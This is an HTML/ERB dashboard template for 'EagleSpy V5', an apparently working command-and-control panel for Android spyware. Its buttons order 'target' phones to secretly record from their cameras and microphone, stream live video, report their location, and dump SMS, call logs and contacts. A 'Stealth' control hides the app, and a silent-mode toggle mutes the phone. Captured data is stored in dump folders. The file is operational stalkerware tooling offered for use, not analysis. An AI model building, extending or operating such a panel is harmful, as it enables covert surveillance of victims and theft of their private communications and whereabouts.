<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EagleSpy V5 Dashboard</title>
<style>
  * { box-sizing: border-box; }
  body { background: #0a0a0f; color: #ccc; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
  h1 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; }
  .device { border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 8px; background: #111; }
  .device h3 { margin: 0 0 10px; color: #fff; display: flex; justify-content: space-between; align-items: center; }
  .status { font-size: 0.8em; padding: 2px 8px; border-radius: 10px; background: #222; }
  .online { color: #0f0; border: 1px solid #0f0; }
  .offline { color: #777; border: 1px solid #555; }
  .meta { font-size: 0.85em; color: #666; margin-bottom: 10px; }
  
  .btn-group { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
  .btn-group button { 
    background: #1a1a1a; border: 1px solid #444; color: #ddd; 
    padding: 8px 15px; cursor: pointer; border-radius: 4px; font-size: 0.9em; transition: all 0.2s;
  }
  .btn-group button:hover { background: #333; border-color: #00d4ff; color: #fff; }
  .btn-group button:active { transform: translateY(1px); }
  .btn-group button.active-cmd { border-color: #f80; color: #f80; }

  /* Tabs */
  .tabs { display: flex; gap: 0; margin-top: 20px; border-bottom: 1px solid #333; }
  .tab { padding: 10px 20px; cursor: pointer; color: #888; border: 1px solid transparent; border-bottom: none; border-radius: 5px 5px 0 0; }
  .tab:hover { color: #fff; }
  .tab.active { color: #00d4ff; background: #151515; border-color: #333; }
  .tab .badge { background: #f00; color: #fff; font-size: 0.7em; padding: 1px 6px; border-radius: 10px; margin-left: 5px; }
  .tab-content { display: none; border: 1px solid #333; border-top: none; background: #151515; padding: 15px; border-radius: 0 0 8px 8px; min-height: 300px; }
  .tab-content.active { display: block; }

  /* Result card */
  .result-card { border: 1px solid #333; padding: 12px; margin-bottom: 10px; border-radius: 6px; background: #111; }
  .result-card .rc-header { display: flex; justify-content: space-between; color: #888; font-size: 0.8em; margin-bottom: 8px; }
  .result-card .rc-cmd { color: #00d4ff; font-weight: bold; }
  .result-card pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 0.9em; }
  .result-card img.preview { max-width: 100%; max-height: 400px; border: 1px solid #444; margin-top: 8px; display: block; }
  .result-card iframe { width: 100%; height: 350px; border: none; background: #222; margin-top: 8px; }

  #log { height: 200px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #0f0; padding: 10px; background: #050505; border-radius: 5px; }
  
  .saved-files { list-style: none; padding: 0; }
  .saved-files li { padding: 6px 10px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
  .saved-files li:hover { background: #1a1a1a; }
  .saved-files a { color: #00d4ff; text-decoration: none; }

  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
  .fade-in { animation: fadeIn 0.3s; }
</style>
</head>
<body>

<h1>
  🦅 EagleSpy V5 
  <span style="font-size:0.5em;color:#666;font-weight:normal">Dashboard</span>
  <button onclick="location.reload()" style="float:right;background:#222;border:1px solid #444;color:#aaa;padding:5px 10px;border-radius:4px;cursor:pointer;font-size:0.5em">↻ Reload</button>
</h1>

<div id="devices-list">
  <% if @devices.present? %>
    <% @devices.each do |device| %>
      <div class="device">
        <h3>
          <%= device.name.presence || "Device #{device.device_id}" %> 
          <% is_online = device.updated_at && device.updated_at > 5.minutes.ago %>
          <span class="status <%= is_online ? 'online' : 'offline' %>">
             <%= is_online ? '● ONLINE' : '○ OFFLINE' %>
          </span>
        </h3>
        <div class="meta">
          ID: <span style="color:#aaa"><%= device.device_id %></span> | 
          DB ID: <span style="color:#aaa"><%= device.id %></span> |
          Last Seen: <%= device.updated_at ? time_ago_in_words(device.updated_at) + " ago" : "Never" %>
        </div>
        
        <div class="btn-group">
          <!-- LIVE -->
          <button onclick="cmd('<%= device.id %>', 'dump_localtime')">📍 Location</button>
          <button onclick="cmd('<%= device.id %>', 'webcam_record', {back_camera: 'true'})">🎥 Rec Back</button>
          <button onclick="cmd('<%= device.id %>', 'webcam_record', {back_camera: 'false'})">🤳 Rec Front</button>
          <button onclick="cmd('<%= device.id %>', 'ambient_record', {duration: 10})">🎙️ Audio 10s</button>
          <button onclick="cmd('<%= device.id %>', 'start_webrtc_stream')">🔴 WebRTC</button>
          
          <!-- DATA -->
          <button onclick="cmd('<%= device.id %>', 'take_picture', {back_camera: 'true'})">📸 Photo</button>
          <button onclick="cmd('<%= device.id %>', 'dump_sysinfo')">ℹ️ Info</button>
          <button onclick="cmd('<%= device.id %>', 'dump_sms')">💬 SMS</button>
          <button onclick="cmd('<%= device.id %>', 'dump_calllogs')">📞 Calls</button>
          <button onclick="cmd('<%= device.id %>', 'dump_contacts')">👥 Contacts</button>
          
          <!-- CONTROL -->
          <button onclick="cmd('<%= device.id %>', 'hide_app')">🙈 Stealth ON</button>
          <button onclick="cmd('<%= device.id %>', 'show_app')">👁️ Stealth OFF</button>
          <button onclick="cmd('<%= device.id %>', 'set_audio_mode', {mode: 'silent'})">🔇 Silent</button>
          <button onclick="cmd('<%= device.id %>', 'set_audio_mode', {mode: 'normal'})">🔊 Normal</button>
        </div>
      </div>
    <% end %>
  <% else %>
    <div style="text-align:center; padding: 50px; color: #555;">
      <h2>No devices connected</h2>
      <p>Install APK on target device and open it once</p>
    </div>
  <% end %>
</div>

<!-- TABS -->
<div class="tabs">
  <div class="tab active" onclick="switchTab('results')">📋 Results <span id="results-badge" class="badge" style="display:none">0</span></div>
  <div class="tab" onclick="switchTab('files')">📁 Saved Files</div>
  <div class="tab" onclick="switchTab('log')">🖥️ Log</div>
</div>

<div id="tab-results" class="tab-content active">
  <div id="results-list">
    <p style="color:#555;text-align:center">Натисни бутон за да изпълниш команда. Резултатите остават тук.</p>
  </div>
</div>

<div id="tab-files" class="tab-content">
  <h4 style="color:#fff;margin-top:0">Запазени файлове (снимки, дъмпове и др.)</h4>
  <ul id="files-list" class="saved-files">
    <li style="color:#555">Зареждане...</li>
  </ul>
</div>

<div id="tab-log" class="tab-content">
  <div id="log">Dashboard ready.</div>
</div>

<script>
// === PERSISTENT STORAGE (localStorage) ===
const STORAGE_KEY = 'eaglespy_results';

function loadResults() {
  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); } 
  catch(e) { return []; }
}
function saveResults(results) {
  // Keep last 100 results
  localStorage.setItem(STORAGE_KEY, JSON.stringify(results.slice(-100)));
}
function addResult(command, deviceId, data) {
  const results = loadResults();
  results.push({
    command, deviceId, data,
    time: new Date().toISOString()
  });
  saveResults(results);
  renderResults();
}

// === TAB SWITCHING ===
function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
  document.querySelector(`.tab[onclick*="${name}"]`).classList.add('active');
  document.getElementById('tab-' + name).classList.add('active');
  if (name === 'files') loadFiles();
}

// === RENDER SAVED RESULTS ===
function renderResults() {
  const results = loadResults();
  const container = document.getElementById('results-list');
  const badge = document.getElementById('results-badge');
  
  if (results.length === 0) {
    container.innerHTML = '<p style="color:#555;text-align:center">Няма резултати.</p>';
    badge.style.display = 'none';
    return;
  }
  
  badge.textContent = results.length;
  badge.style.display = 'inline';
  
  // Render newest first
  container.innerHTML = results.slice().reverse().map((r, idx) => {
    const time = new Date(r.time).toLocaleTimeString();
    const date = new Date(r.time).toLocaleDateString();
    return `<div class="result-card fade-in">
      <div class="rc-header">
        <span class="rc-cmd">${r.command}</span>
        <span>${date} ${time} | Device ${r.deviceId}
          <button onclick="deleteResult(${results.length - 1 - idx})" style="background:none;border:none;color:#f55;cursor:pointer;font-size:0.9em" title="Изтрий">✕</button>
        </span>
      </div>
      ${formatResultHTML(r.command, r.data)}
    </div>`;
  }).join('');
}

function deleteResult(idx) {
  const results = loadResults();
  results.splice(idx, 1);
  saveResults(results);
  renderResults();
}

function clearAllResults() {
  localStorage.removeItem(STORAGE_KEY);
  renderResults();
}

// === FORMAT RESULT HTML ===
function formatResultHTML(command, data) {
  // Location
  if (command === 'dump_localtime') {
    let lat, lng, accuracy;
    if (data && typeof data === 'object' && !Array.isArray(data) && data.latitude) {
      lat = data.latitude; lng = data.longitude; accuracy = data.accuracy;
    } else if (Array.isArray(data)) {
      const str = data.join(' ');
      const latM = str.match(/Lat:?\s*([\d.-]+)/i);
      const lngM = str.match(/Lon[g]?:?\s*([\d.-]+)/i);
      if (latM) lat = latM[1];
      if (lngM) lng = lngM[1];
    }
    if (lat && lng) {
      return `<div style="color:#00d4ff;font-size:1.1em;margin-bottom:8px">📍 ${lat}, ${lng} ${accuracy ? '(±'+accuracy+'m)' : ''}</div>
        <iframe src="https://www.openstreetmap.org/export/embed.html?bbox=${parseFloat(lng)-0.01},${parseFloat(lat)-0.01},${parseFloat(lng)+0.01},${parseFloat(lat)+0.01}&layer=mapnik&marker=${lat},${lng}"></iframe>
        <div style="margin-top:5px"><a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color:#00d4ff">📌 Google Maps</a></div>`;
    }
  }
  
  // Photo with URL
  if ((command === 'take_picture' || command === 'webcam_record') && typeof data === 'string' && (data.startsWith('/') || data.startsWith('http'))) {
    return `<img src="${data}" class="preview" /><div style="margin-top:5px"><a href="${data}" download style="color:#00d4ff">⬇️ Download</a></div>`;
  }
  
  // Default: pretty print
  let text = '';
  if (Array.isArray(data)) text = data.join('\n');
  else if (typeof data === 'object') text = JSON.stringify(data, null, 2);
  else text = String(data);
  return `<pre>${escapeHtml(text)}</pre>`;
}

function escapeHtml(s) {
  const d = document.createElement('div'); d.textContent = s; return d.innerHTML;
}

// === LOG ===
function log(msg, type='info') {
  const el = document.getElementById('log');
  const time = new Date().toLocaleTimeString();
  const color = type === 'error' ? '#f55' : (type === 'success' ? '#0f0' : '#ccc');
  el.innerHTML = `<div style="color:${color}"><span style="color:#555">[${time}]</span> ${msg}</div>` + el.innerHTML;
}

// === COMMAND ROUTING ===
const CMD_MAP = {
  'dump_localtime':     { url: '/geo_locations/dump_location', method: 'GET' },
  'dump_sms':           { url: '/sms_messages/dump_messages', method: 'POST' },
  'dump_calllogs':      { url: '/call_logs/dump_calllogs', method: 'POST' },
  'dump_contacts':      { url: '/contacts/dump_contacts', method: 'POST' },
  'take_picture':       { url: '/pictures/take_picture', method: 'POST' },
  'webcam_record':      { url: '/smartphones/webcam_record', method: 'GET' },
  'hide_app':           { url: '/smartphones/hide_app', method: 'GET' },
  'show_app':           { url: '/smartphones/show_app', method: 'GET' },
  'start_webrtc_stream':{ url: '/smartphones/start_webrtc_stream', method: 'POST' },
  'dump_sysinfo':       { url: '/smartphones/dump_sysinfo', method: 'POST' },
  'ambient_record':     { url: '/smartphones/ambient_record', method: 'POST' },
  'set_audio_mode':     { url: '/smartphones/set_audio_mode', method: 'POST' },
  'dump_device_info':   { url: '/smartphones/dump_device_info', method: 'POST' },
  'dump_wifi_info':     { url: '/smartphones/dump_wifi_info', method: 'POST' },
};

async function cmd(deviceId, command, params = {}) {
  log(`Executing <b>${command}</b> on device ${deviceId}...`);
  
  const route = CMD_MAP[command] || { url: `/smartphones/${command}`, method: 'POST' };
  let url = `${route.url}?smartphone_id=${deviceId}`;
  const method = route.method;
  
  // Append extra params
  const qs = new URLSearchParams(params).toString();
  if (qs) url += `&${qs}`;

  try {
    const res = await fetch(url, {
      method: method,
      headers: { 'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest' }
    });
    
    const contentType = res.headers.get("content-type") || '';
    let rawText = await res.text();
    let output = null;

    if (contentType.includes('application/json')) {
      try {
        const json = JSON.parse(rawText);
        output = json.data || json.output;
        if (json.url) output = json.url;
      } catch (e) { console.error("JSON parse error", e); }
    } else {
      // Fallback: try var commandOutput = ... or pure JSON
      const match = rawText.match(/var\s+commandOutput\s*=\s*(.*);/);
      if (match) { try { output = JSON.parse(match[1]); } catch(e) { output = match[1]; } }
      else { try { output = JSON.parse(rawText); } catch(e) {} }
    }
    
    if (res.ok && output) {
      log(`✅ ${command} — success`, 'success');
      addResult(command, deviceId, output);
      switchTab('results');
    } else if (res.ok) {
      log(`✅ ${command} — sent (no immediate data)`, 'success');
      addResult(command, deviceId, ['Command sent, waiting for device response...']);
      switchTab('results');
    } else {
      log(`❌ ${command} — Error ${res.status}`, 'error');
      addResult(command, deviceId, [`Error ${res.status}: ${rawText.substring(0, 200)}`]);
    }
  } catch (e) {
    log(`❌ ${command} — Network Error: ${e.message}`, 'error');
  }
}

// === LOAD SAVED FILES ===
async function loadFiles() {
  const container = document.getElementById('files-list');
  const dirs = ['pictures', 'calllogs_dumps', 'contacts_dumps', 'sms_dumps'];
  let allFiles = [];
  
  // We can't browse the filesystem from JS, so show known dump locations
  container.innerHTML = `
    <li><strong style="color:#fff">📁 Файловете се записват в:</strong></li>
    <li>📸 Снимки: <code>files/dumps/pictures/</code></li>
    <li>📞 Обаждания: <code>files/dumps/calllogs_dumps/</code></li>
    <li>👥 Контакти: <code>files/dumps/contacts_dumps/</code></li>
    <li>💬 SMS: <code>files/dumps/sms_dumps/</code></li>
    <li>🎙️ Записи: <code>files/dumps/recordings/</code></li>
    <li style="margin-top:10px;color:#888">Пътят е относителен спрямо <code>E:\\EagleSpy V5\\</code></li>
    <li style="margin-top:5px"><button onclick="clearAllResults()" style="background:#300;border:1px solid #f55;color:#f55;padding:5px 15px;cursor:pointer;border-radius:4px">🗑️ Изчисти всички резултати</button></li>
  `;
}

// === INIT: render saved results on page load ===
renderResults();
</script>

</body>
</html>